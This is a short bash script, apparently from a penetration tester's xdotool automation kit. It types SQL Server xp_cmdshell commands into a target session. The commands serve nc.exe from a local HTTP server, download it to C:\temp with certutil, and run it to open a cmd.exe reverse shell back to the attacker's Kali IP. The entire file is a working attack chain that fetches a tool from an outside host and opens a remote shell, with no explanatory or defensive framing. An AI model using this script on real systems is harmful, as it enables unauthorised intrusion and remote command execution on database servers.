#!/bin/bash

: '
execute xp_cmdshell nc reverse shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

# Generate gui form
generate_form "HTTP PORT" "SHELL PORT"

HTTP_PORT=${form_data["HTTP PORT"]}
SHELL_PORT=${form_data["SHELL PORT"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!


TMP_FOLDER="C:\temp"

paste_command "EXEC xp_cmdshell 'if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}'"
xdotool key Return
sleep 0.8

paste_command "EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/nc.exe ${TMP_FOLDER}\nc.exe'"
xdotool key Return
sleep 3

paste_command "EXEC xp_cmdshell '${TMP_FOLDER}\nc.exe ${KALI_IP} ${SHELL_PORT} -e cmd.exe'"
xdotool key Return
sleep 10

kill $HTTP_PID